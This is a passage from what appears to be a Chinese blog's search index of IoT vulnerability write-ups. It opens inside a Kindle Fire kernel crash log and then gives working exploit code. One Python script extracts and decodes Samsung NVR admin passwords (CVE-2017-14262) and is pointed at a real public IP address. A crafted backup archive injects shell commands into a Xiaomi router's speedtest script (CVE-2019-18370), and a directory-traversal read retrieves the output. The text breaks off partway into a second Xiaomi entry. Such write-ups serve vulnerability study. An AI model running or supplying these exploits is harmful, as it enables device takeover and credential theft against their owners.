e89da8f0[18460.444885] b040 e24b0e17 e3a0100c ebfcf5c4 eafffff8 e1a00004 e24b1e17 e3a0200c ebfced7f[18460.455444] b060 e3500000 0afffff3 eafffff1 e51b2170 e24b101c e30f3eb4 e34f3fff e0812102[18460.465972] b080 e5122134 e18120b3 eaffffe3 03e0303c 150b016c 050b316c eaffffdf c0acabbc[18460.476623] b0a0 e1a0c00d e92dd800 e24cb004 e59030e0 e3530000 159000ec 03e00012 e89da800[18460.487182] b0c0 e1a0c00d e92dd800 e24cb004 e59000f0 e89da800 e1a0c00d e92dd800 e24cb004[18460.497863] b0e0 e5d020e9 e5d030e8 e1820003 e2000003 e89da800 e1a0c00d e92dd800 e24cb004[18460.508544] [18460.508544] LR: 0xc031a8d0:[18460.513519] a8d0 e89da878 e1a00004 ebffff20 e2000003 e3500002 13e0000a 03a00000 e89da878[18460.524078] a8f0 c09ba0c0 e1a0c00d e92ddff0 e24cb004 e24dd014 e2509000 0a000114 e59f5454[18460.534759] a910 e595008c e3500000 0a00010b e2800004 eb0e1ff0 e1d910b6 e3510001 9a00000a[18460.545318] a930 e595308c e3e06015 e59f142c e5930000 ebff4e6b e595a08c e28a0004 eb0e1f69[18460.555999] a950 e1a00006 e24bd028 e89daff0 e595a08c e3a03f52 e023a193 e5933038 e3530000[18460.566680] a970 13e0600f 1afffff3 e59a32c4 e0818101 e595c088 e3130010 e08c7008 1a000025[18460.577331] a990 e3510000 0a0000c4 e1d930b8 e3530001 0a0000d7 e1d940b6 e3540000 0a0000bc[18460.587890] a9b0 e3a0000e e3a01002 e3a02090 e5956088 ebfff8bc e3540001 0a0000d1 e1d920b6[18460.598571] [18460.598571] SP: 0xde94dd10:[18460.603546] dd10 00000000 0000000d de94dda0 10624dd3 de94dd4c c031b080 60030013 ffffffff[18460.614196] dd30 de94dd7c bea875ec de94df04 de94dd48 c06a5318 c0008370 00000001 de94dee8[18460.624877] dd50 4b3f2730 fffffeb4 bea875ec 00006100 00000000 de94c000 bea875ec dcccf608[18460.635528] dd70 00000000 de94df04 00000000 de94dd90 c031a950 c031b080 60030013 ffffffff[18460.646087] dd90 de94ddac 9b2a9212 00000000 00000000 00040000 0001f8fc 00000000 00000000[18460.656738] ddb0 c00795a0 00000001 de94ddd4 de94ddc8 c00795b4 c00792bc de94de0c de94ddd8[18460.667419] ddd0 c0070df8 c00795ac de94c000 00000001 00000004 dd32f8f4 60000013 00000001[18460.678100] ddf0 00000001 00000004 dd32f800 00000000 00000000 de94de10 c00723a0 c06a4818[18460.688629] [18460.688659] FP: 0xde94de84:[18460.693725] de84 de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0[18460.704284] dea4 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000[18460.714935] dec4 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000[18460.725616] dee4 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044[18460.736328] df04 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8[18460.746856] df24 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000[18460.757537] df44 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000[18460.768096] df64 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000 00000400[18460.778625] [18460.778625] R1: 0xde94de68:[18460.783721] de68 c2572140 de94debc 00000001 00000028 000fffff 00000001 de94dedc de94de90[18460.794403] de88 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8 c00723a0 000fffff[18460.804962] dea8 00000000 ffffffff 00000002 00000001 00000000 de94df14 00000000 00000001[18460.815643] dec8 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000 00000000 00000000[18460.826202] dee8 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08 c0136044 c031af2c[18460.836730] df08 00000000 00000000 00000000 00000001 00000000 dd188490 d8f925d8 de94df0c[18460.847381] df28 de94c000 bea87618 bea875ec 00006100 d683fb40 00000004 de94c000 00000000[18460.858032] df48 de94df64 00000000 bea875ec 00006100 d683fb40 00000004 de94c000 00000000[18460.868713] [18460.868713] R3: 0xfffffe34:[18460.873687] fe34 ******** ******** ******** ******** ******** ******** ******** ********[18460.884246] fe54 ******** ******** ******** ******** ******** ******** ******** ********[18460.894805] fe74 ******** ******** ******** ******** ******** ******** ******** ********[18460.905456] fe94 ******** ******** ******** ******** ******** ******** ******** ********[18460.916137] feb4 ******** ******** ******** ******** ******** ******** ******** ********[18460.926788] fed4 ******** ******** ******** ******** ******** ******** ******** ********[18460.937347] fef4 ******** ******** ******** ******** ******** ******** ******** ********[18460.948028] ff14 ******** ******** ******** ******** ******** ******** ******** ********[18460.958709] [18460.958709] R7: 0xde94bf80:[18460.963684] bf80 de926680 c00635cc 00000013 de84190c de926680 c00635cc 00000013 00000000[18460.974365] bfa0 00000000 00000000 de94bff4 de94bfb8 c0068af4 c00635d8 00000000 00000000[18460.985015] bfc0 de926680 00000000 00000000 00000000 de94bfd0 de94bfd0 00000000 de84190c[18460.995574] bfe0 c0068a64 c004cd64 00000000 de94bff8 c004cd64 c0068a70 1d04e2fb 1dfbe204[18461.006225] c000 00000000 00000002 00000000 c2572140 c0a0e840 00000000 00000015 cf9fca80[18461.016906] c020 00000000 de94c000 c09ddc50 c2572140 c25717c0 c1617b40 de94da7c de94d9c8[18461.027587] c040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000[18461.038146] c060 00c5f4c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000[18461.048828] [18461.048828] R9: 0xdcccf588:[18461.053802] f588 dcccf588 dcccf588 00000000 00000000 00000000 c06bc674 000200da c09dda58[18461.064483] f5a8 00000000 00000000 dcccf5b0 dcccf5b0 00000000 dcccf5bc dcccf5bc 00000000[18461.075134] f5c8 5ae3ed25 00000000 00000000 00000000 dcccf5e0 00000000 00000000 00000000[18461.085815] f5e8 00200000 00000000 00000000 dcccf5f4 dcccf5f4 dccb2440 dccb2440 00000000[18461.096343] f608 00052180 00000000 00000000 00000000 00000000 00000000 c06b9600 dd1a4800[18461.107025] f628 dcccf6e0 dccb0300 00000c45 00000001 00a0003b 5ae3ed25 2bc5ac58 5ae3ed25[18461.117675] f648 2bc5ac58 5ae3ed25 2bc5ac58 00000000 00000000 00000000 00000000 00000000[18461.128234] f668 00000000 00000000 00000000 00000000 00000001 00000000 00000000 dcccf684[18461.138885] Process twl6030_gpadc_i (pid: 12849, stack limit = 0xde94c2f8)[18461.146697] Stack: (0xde94dd90 to 0xde94e000)[18461.151611] dd80: de94ddac 9b2a9212 00000000 00000000[18461.160827] dda0: 00040000 0001f8fc 00000000 00000000 c00795a0 00000001 de94ddd4 de94ddc8[18461.170043] ddc0: c00795b4 c00792bc de94de0c de94ddd8 c0070df8 c00795ac de94c000 00000001[18461.179138] dde0: 00000004 dd32f8f4 60000013 00000001 00000001 00000004 dd32f800 00000000[18461.188354] de00: 00000000 de94de10 c00723a0 c06a4818 00000004 00000001 dd32e0d8 dd32f800[18461.197570] de20: dd32e000 0000000a de94c000 c26fda80 de94de54 de94de40 c02ba53c c0072360[18461.206787] de40: dd32f800 dd32e000 de94de74 de94de58 c02c3c88 c02ba518 dd32e000 00000002[18461.215881] de60: 00000002 dd32fbbc c2572140 de94debc 00000001 00000028 000fffff 00000001[18461.225097] de80: de94dedc de94de90 c0207454 c00bd920 0000001e c26fda80 de94ded4 de94dea8[18461.234313] dea0: c00723a0 000fffff 00000000 ffffffff 00000002 00000001 00000000 de94df14[18461.243408] dec0: 00000000 00000001 dcccf608 cfa9bf00 de94defc de94dee0 c02089fc 00000000[18461.252624] dee0: 00000000 00000000 00000000 d683fb40 00000004 d683fb40 de94df74 de94df08[18461.261840] df00: c0136044 c031af2c 00000000 00000000 00000000 00000001 00000000 dd188490[18461.271057] df20: d8f925d8 de94df0c de94c000 bea87618 bea875ec 00006100 d683fb40 00000004[18461.280151] df40: de94c000 00000000 de94df64 00000000 bea875ec 00006100 d683fb40 00000004[18461.289367] df60: de94c000 00000000 de94dfa4 de94df78 c01365e0 c0135fc4 00000000 00000000[18461.298583] df80: 00000400 bea87618 00010e5c 00000000 00000036 c0013e08 00000000 de94dfa8[18461.307800] dfa0: c0013c60 c0136578 bea87618 00010e5c 00000004 00006100 bea875ec bea875ec[18461.316894] dfc0: bea87618 00010e5c 00000000 00000036 00000000 00000000 00000000 bea87604[18461.326110] dfe0: 00000000 bea875d4 00010698 0002918c 60000010 00000004 00000000 00000000[18461.335296] Backtrace: [18461.338317] [&lt;c031af20&gt;] (twl6030_gpadc_ioctl+0x0/0x180) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)[18461.348571] r7:d683fb40 r6:00000004 r5:d683fb40 r4:00000000[18461.355560] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)[18461.364807] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)[18461.374206] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e5c r4:bea87618[18461.382507] Code: e24b101c e30f3eb4 e34f3fff e0812102 (e5122134) [18461.401061] Board Information: [18461.401061] Revision : 0001[18461.401092] Serial : 0000000000000000[18461.401092] SoC Information:[18461.401092] CPU : OMAP4470[18461.401122] Rev : ES1.0[18461.401122] Type : HS[18461.401122] Production ID: 0002B975-000000CC[18461.401122] Die ID : 1CC60000-50002FFF-0B00935D-11007004[18461.401153] [18461.406127] audit_printk_skb: 111 callbacks suppressed[18461.406127] type=1400 audit(1525657115.783:1097): avc: denied { getattr } for pid=12851 comm=&quot;am&quot; path=&quot;/system/bin/app_process&quot; dev=&quot;mmcblk0p9&quot; ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file[18461.406280] type=1400 audit(1525657115.783:1098): avc: denied { execute } for pid=12851 comm=&quot;am&quot; name=&quot;app_process&quot; dev=&quot;mmcblk0p9&quot; ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file[18461.406524] type=1400 audit(1525657115.783:1099): avc: denied { read open } for pid=12851 comm=&quot;am&quot; name=&quot;app_process&quot; dev=&quot;mmcblk0p9&quot; ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file[18461.406768] type=1400 audit(1525657115.783:1100): avc: denied { execute_no_trans } for pid=12851 comm=&quot;am&quot; path=&quot;/system/bin/app_process&quot; dev=&quot;mmcblk0p9&quot; ino=32006 scontext=u:r:untrusted_app:s0 tcontext=u:object_r:zygote_exec:s0 tclass=file[18461.534057] ---[ end trace f98f4a7b98572f61 ]---[18461.540374] Kernel panic - not syncing: Fatal exception[18461.546173] CPU1: stopping[18461.549285] Backtrace: [18461.552459] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)[18461.561828] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950[18461.568969] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)[18461.578185] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)[18461.587554] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40/0x60)[18461.596862] Exception stack(0xc8967fb0 to 0xc8967ff8)[18461.602691] 7fa0: 404143ed 4041294b 00000054 000012f0[18461.611755] 7fc0: 4028cdb4 4040e438 0000012f 4041294b 4040d148 404111d8 beb9c2e0 404275c0[18461.620971] 7fe0: 40416bef beb9c1f0 4009d01f 400a0ec0 000f0010 ffffffff[18461.628478] r6:ffffffff r5:000f0010 r4:400a0ec0 r3:404143ed[18461.635559] CPU0 PC (0) : 0xc003ee38[18461.639617] CPU0 PC (1) : 0xc003ee54[18461.643798] CPU0 PC (2) : 0xc003ee54[18461.647857] CPU0 PC (3) : 0xc003ee54[18461.651916] CPU0 PC (4) : 0xc003ee54[18461.656097] CPU0 PC (5) : 0xc003ee54[18461.660156] CPU0 PC (6) : 0xc003ee54[18461.664215] CPU0 PC (7) : 0xc003ee54[18461.668395] CPU0 PC (8) : 0xc003ee54[18461.672454] CPU0 PC (9) : 0xc003ee54[18461.676513] CPU1 PC (0) : 0xc0019b2c[18461.680694] CPU1 PC (1) : 0xc0019b2c[18461.684753] CPU1 PC (2) : 0xc0019b2c[18461.688812] CPU1 PC (3) : 0xc0019b2c[18461.692871] CPU1 PC (4) : 0xc0019b2c[18461.697051] CPU1 PC (5) : 0xc0019b2c[18461.701110] CPU1 PC (6) : 0xc0019b2c[18461.705169] CPU1 PC (7) : 0xc0019b2c[18461.709381] CPU1 PC (8) : 0xc0019b2c[18461.713409] CPU1 PC (9) : 0xc0019b2c[18461.717498] [18461.719268] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017[18461.719299]","link":"/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11025%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2017-14262）Samsung NVR devices 漏洞","text":"一、漏洞简介Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。 Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。 二、漏洞影响三、复现过程poc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding:utf-8 -*-from collections import OrderedDictfrom itertools import takewhileimport requestsclass SamsungNVR(object): &quot;&quot;&quot; 此漏洞三星和 uniview 都有 &quot;&quot;&quot; vul_info = { &quot;title&quot;: &quot;Samsung NVR设备安全漏洞&quot;, &quot;cve&quot;: &quot;CVE-2017-14262&quot;, &quot;desc&quot;: &quot;Samsung NVR devices是韩国三星（Samsung）公司的一款网络视频录像机设备。&quot; &quot;Samsung NVR设备中存在安全漏洞。远程攻击者可利用该漏洞读取管理员账户的MD5密码散列，并登录设备。&quot; } pass_index = OrderedDict( [(1, 1), (9192090, 2), (1020910, 3), (25549780, 4), (24507899, 5), (16119889, 6), (9428219, 7), (2281891, 8), (10861120, 9), (15331742, 10), (22464897, 11), (24403461, 12), (13833575, 13), (16061285, 14), (10721046, 15), (16593252, 16), (22051260, 17), (16638739, 18), (6666540, 19), (9283102, 20), (18791719, 21), (25905184, 22), (2762182, 23), (12911758, 24), (21944959, 25), (10257708, 26), (894574, 27), (16004987, 28), (12850146, 29), (8043423, 30), (7835618, 31), (18372773, 32), (9417841, 33), (18658565, 34), (10330028, 35), (13289156, 36), (23739388, 37), (12401865, 38), (15005445, 39), (10176399, 40), (10776092, 41), (16860945, 42), (5353890, 43), (2688051, 44), (39030, 45), (18708319, 46), (23920727, 47), (4762271, 48), (24294435, 49), (16720763, 50), (21207445, 51), (20598600, 52), (13303854, 53), (2666164, 54), (19813766, 55), (16041010, 56), (3127839, 57), (25260962, 58), (15859882, 59), (23452596, 60), (11396657, 61), (18994119, 62), (12423246, 63), (21498126, 64), (23593931, 65), (9818447, 66), (14937061, 67), (24683641, 68), (11058089, 69), (12800298, 70), (133183, 71), (26013724, 72), (19021449, 73), (25487361, 74), (3426696, 75), (22326185, 76), (9151922, 77), (20416123, 78), (13876302, 79), (497003, 80), (18662430, 81), (7306818, 82), (24323487, 83), (26110937, 84), (5380058, 85), (21481095, 86), (9540458, 87), (14123621, 88), (6847253, 89), (7638896, 90), (22385568, 91), (1208753, 92), (15383366, 93), (24719837, 94), (26729699, 95), (3594142, 96), (371291, 97), (23345327, 98), (4415431, 99), (6477625, 100), (4733341, 101), (13423221, 102), (24215867, 103), (7503741, 104), (6390751, 105), (10192199, 106), (10352855, 107), (22393893, 108), (7198498, 109), (12838108, 110), (5515125, 111), (7229843, 112), (13872090, 113), (21671745, 114), (12457317, 115), (26153875, 116), (14327497, 117), (11382568, 118), (10132668, 119), (20086929, 120), (8117696, 121), (2098389, 122), (21553350, 123), (23391670, 124), (25350683, 125), (25970062, 126), (6959731, 127), (16338714, 128)]) @classmethod def decrypt_password(cls, json_resp): &quot;&quot;&quot;解密管理员账户密码&quot;&quot;&quot; try: au_pwd = takewhile(lambda x: x != 0, json_resp[&quot;au32LoginPasswd&quot;]) password = &quot;&quot;.join(chr(cls.pass_index[pwd_int]) for pwd_int in au_pwd) except KeyError: password = &quot;&quot; return password def __init__(self, ip: str, port: int): self._base_url = f&quot;http://{ip}:{port}&quot; def verify(self): vul_path = '/cgi-bin/main-cgi?json={&quot;cmd&quot;:201,&quot;szUserName_Qry&quot;:&quot;admin&quot;,&quot;szUserName&quot;:&quot;&quot;,&quot;u32UserLoginHandle&quot;:0}' url = self._base_url + vul_path try: req = requests.get(url, timeout=10) if req.status_code == 200: res_json = req.json() hash_pass = res_json.get(&quot;szLoginPasswd&quot;, &quot;&quot;) if hash_pass: plain_pass = self.decrypt_password(res_json) if plain_pass: return {&quot;user&quot;: &quot;admin&quot;, &quot;password&quot;: plain_pass} except Exception as e: print(e)if __name__ == '__main__': vul = SamsungNVR(&quot;117.158.178.49&quot;, 84) vulres = vul.verify() print(f&quot;[-] {vul.vul_info}&quot;) if vulres: print(f&quot;[+] 存在漏洞:{vulres}&quot;) else: print(&quot;[-] 不存在漏洞。&quot;)","link":"/2020/08/06/IOT/Exploit/%E4%B8%89%E6%98%9F/%EF%BC%88CVE-2017-14262%EF%BC%89Samsung%20NVR%20devices%20%E6%BC%8F%E6%B4%9E/"},{"title":"(CVE-2019-18370)Xiaomi Mi WiFi R3G 远程命令执行漏洞","text":"一、漏洞简介Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。 二、漏洞影响Xiaomi Mi WiFi R3G 2.28.23-stable之前版本 三、复现过程备份文件是tar.gz格式的，上传后tar zxf解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。 备份文件解压导致/tmp/目录任意文件可控 在/usr/lib/lua/luci/controller/api/misystem.lua中，配置文件功能如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function cUpload() local LuciFs = require(&quot;luci.fs&quot;) local XQBackup = require(&quot;xiaoqiang.module.XQBackup&quot;) local code = 0 local canupload = true local uploadFilepath = &quot;/tmp/cfgbackup.tar.gz&quot; local fileSize = tonumber(LuciHttp.getenv(&quot;CONTENT_LENGTH&quot;)) if fileSize &gt; 102400 then canupload = false end LuciHttp.setfilehandler( function(meta, chunk, eof) if canupload then if not fp then if meta and meta.name == &quot;image&quot; then fp = io.open(uploadFilepath, &quot;w&quot;) end end if chunk then fp:write(chunk) end if eof then fp:close() end else code = 1630 end end ) if LuciHttp.formvalue(&quot;image&quot;) and fp then code = 0 end local result = {} if code == 0 then local ext = XQBackup.extract(uploadFilepath) if ext == 0 then result[&quot;des&quot;] = XQBackup.getdes() else code = 1629 end end if code ~= 0 then result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code) LuciFs.unlink(uploadFilepath) end result[&quot;code&quot;] = code LuciHttp.write_json(result)end 其中调用XQBackup.extract(uploadFilepath)进行解压 12345678910111213141516171819202122-- 0:succeed-- 1:file does not exist-- 2:no description file-- 3:no mbu filefunction extract(filepath) local fs = require(&quot;nixio.fs&quot;) local tarpath = filepath if not tarpath then tarpath = TARMBUFILE end if not fs.access(tarpath) then return 1 end os.execute(&quot;cd /tmp; tar -xzf &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;) os.execute(&quot;rm &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;) if not fs.access(DESFILE) then return 2 end if not fs.access(MBUFILE) then return 3 end return 0 可知，/tmp目录下的任意文件可控 /usr/bin/upload_speedtest,/usr/bin/download_speedtest等会读取/tmp/speedtest_urls.xml`并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用 举例，查看/usr/bin/download_speedtest文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/usr/bin/env lua-- ...local cfg = {-- ... ['xmlfile'] = &quot;/usr/share/speedtest.xml&quot;, ['tmp_speedtest_xml'] = &quot;/tmp/speedtest_urls.xml&quot;,}VERSION=&quot;__UNDEFINED__&quot;-- ...-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xmllocal filename = &quot;&quot;filexml = io.open(cfg.tmp_speedtest_xml)if filexml then filexml:close() filename = cfg.tmp_speedtest_xmlelse filename = cfg.xmlfileendlocal pp = io.open(filename)local line = pp:read(&quot;*line&quot;)local size = 0local resources = {}local u = &quot;&quot;local pids = {}-- ...function wget_work(url) local _url = url pid = posix.fork() if pid &lt; 0 then print(&quot;fork error&quot;) return -1 elseif pid &gt; 0 then --print(string.format(&quot;child pid %d\\n&quot;, pid)) else -- 拼接命令，最终在这里执行 os.execute('for i in $(seq '.. math.floor(cfg.nr/cfg.nc) ..'); do wget '.. url .. &quot; -q -O /dev/null; done&quot;) end return pidendwhile line do -- 从文件中提取url， 这里提取没有进行过滤 local _, _, url = string.find(line,'&lt;item url=&quot;(.*)&quot;/&gt;') if url then table.insert(resources, url) end line = pp:read(&quot;*line&quot;)endpp:close()local urls = mrandom(1, table.getn(resources), cfg.nc)for k, v in ipairs(urls) do if VERSION == &quot;LESSMEM&quot; then local pid = wget_work_loop(resources[v]) else -- VERSION 为 __UNDEFINED__， url直接作为参数 local pid = wget_work(resources[v]) end if(pid == 0) then os.exit(0) elseif(pid == -1) then done() endend 调用的地方貌似有好几个，其中/usr/lib/lua/luci/controller/api/xqnetdetect.lua中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function netspeed() local XQPreference = require(&quot;xiaoqiang.XQPreference&quot;) local XQNSTUtil = require(&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;) local code = 0 local result = {} local history = LuciHttp.formvalue(&quot;history&quot;) if history then result[&quot;bandwidth&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH&quot;, 0, &quot;xiaoqiang&quot;)) result[&quot;download&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth)) result[&quot;bandwidth2&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH2&quot;, 0, &quot;xiaoqiang&quot;)) result[&quot;upload&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth2)) else os.execute(&quot;/etc/init.d/miqos stop&quot;) -- 这里调用了downloadSpeedTest local download = XQNSTUtil.downloadSpeedTest() if download then result[&quot;download&quot;] = download result[&quot;bandwidth&quot;] = tonumber(string.format(&quot;%.2f&quot;, 8 * download/1024)) XQPreference.set(&quot;BANDWIDTH&quot;, tostring(result.bandwidth), &quot;xiaoqiang&quot;) else code = 1588 end if code ~= 0 then result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code) end os.execute(&quot;/etc/init.d/miqos start&quot;) end result[&quot;code&quot;] = code LuciHttp.write_json(result)endfunction downloadSpeedTest() local speedtest = &quot;/usr/bin/download_speedtest&quot; local speed -- 直接调用sh文件 for _, line in ipairs(LuciUtil.execl(speedtest)) do if not XQFunction.isStrNil(line) and line:match(&quot;^avg rx:&quot;) then speed = line:match(&quot;^avg rx:(%S+)&quot;) if speed then speed = tonumber(string.format(&quot;%.2f&quot;,speed/8)) end break end end return speedend 所以，我们只需要构造恶意的speedtest_urls.xml文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。 poc template.xml 1234567891011121314151617181920212223242526272829303132&lt;?xml version=&quot;1.0&quot;?&gt;&lt;root&gt; &lt;class type=&quot;1&quot;&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;/class&gt; &lt;class type=&quot;2&quot;&gt; &lt;item url=&quot;http://192.168.31.1 -q -O /dev/null;{command}&gt;/tmp/1.txt; exit; wget http://192.168.31.1 &quot;/&gt; &lt;/class&gt; &lt;class type=&quot;3&quot;&gt; &lt;item uploadurl=&quot;http://www.taobao.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.so.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.qq.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.sohu.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.tudou.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.360doc.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.kankan.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.speedtest.cn/&quot;/&gt; &lt;/class&gt;&lt;/root&gt; remote_command_execution_vulnerability.py 12345678910111213141516171819202122232425262728293031323334353637383940import osimport tarfileimport requests# proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}proxies = {}## get stokstok = input(&quot;stok: &quot;)## make config filecommand = input(&quot;command: &quot;)speed_test_filename = &quot;speedtest_urls.xml&quot;with open(&quot;template.xml&quot;,&quot;rt&quot;) as f: template = f.read()data = template.format(command=command)# print(data)with open(&quot;speedtest_urls.xml&quot;,'wt') as f: f.write(data)with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar: # tar.add(&quot;cfg_backup.des&quot;) # tar.add(&quot;cfg_backup.mbu&quot;) tar.add(&quot;speedtest_urls.xml&quot;)## upload config fileprint(&quot;start uploading config file ...&quot;)r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload&quot;.format(stok), files={&quot;image&quot;:open(&quot;payload.tar.gz&quot;,'rb')}, proxies=proxies)# print(r1.text)## exec download speed test, exec commandprint(&quot;start exec command...&quot;)r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)# print(r2.text)## read result filer3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)if r3.status_code == 200: print(&quot;success, vul&quot;) print(r3.text) 修复方案 将备份文件格式修改为特定格式，直接读取备份文件内容，而不需使用解压 从speedtest_urls.xml中读取urls时，进行必要的过滤，防止命令注入 参考链接 https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md","link":"/2020/09/12/IOT/Exploit/%E5%B0%8F%E7%B1%B3/CVE-2019-18370-Xiaomi-Mi-WiFi-R3G-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"title":"(CVE-2019-18371)Xiaomi Mi WiFi R3G 远程命令执行漏洞","text":"一、漏洞简介Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。 二、漏洞影响Xiaomi Mi WiFi R3G 2.28.23-stable之前版本 三、复现过程小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录）nginx配置不当可导致目录穿越漏洞， 123location /xxx { alias /abc/;} 可通过访问http://domain.cn/xxx../etc/passwd实现目录穿越访问上级目录及其子目录文件。 在小米路由器的文件/etc/sysapihttpd/sysapihttpd.conf中，存在 123location 